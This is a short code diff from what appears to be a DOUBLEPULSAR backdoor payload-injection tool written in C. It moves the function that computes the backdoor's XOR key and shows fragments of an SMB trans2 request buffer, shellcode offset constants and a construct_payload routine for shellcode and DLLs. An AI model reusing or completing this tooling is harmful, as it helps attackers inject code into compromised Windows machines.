@@ -41,19 +41,12 @@ unsigned char trans2_request[] =
 HANDLE hProcHeap;
 unsigned char recvbuff[2048];
 
-unsigned int ComputerDOUBLEPULSARXorKey(unsigned int sig)
-{
-	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
-		(((sig << 16) | sig & 0xFF00) << 8));
-}
-
 typedef struct {
 	LPBYTE lpbData;
 	DWORD dwDataSize;
 } BUFFER_WITH_SIZE;
 
 typedef BUFFER_WITH_SIZE* PBUFFER_WITH_SIZE;
-
 #define SHELLC_DLL_SIZE_OFFSET 0xf82
 #define SHELLC_ORDINAL_OFFSET 0xf86
 
@@ -147,6 +140,11 @@ void construct_payload(LPCSTR shellcode_file, LPCSTR dll_file, long ordinal, PBU
 	pBws->dwDataSize = dwPayloadSize;
 }
 
+unsigned int ComputerDOUBLEPULSARXorKey(unsigned int sig)
+{
+	return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) |
+		(((sig << 16) | sig & 0xFF00) << 8));
+}
 
 int main(int argc, char* argv[])
 {
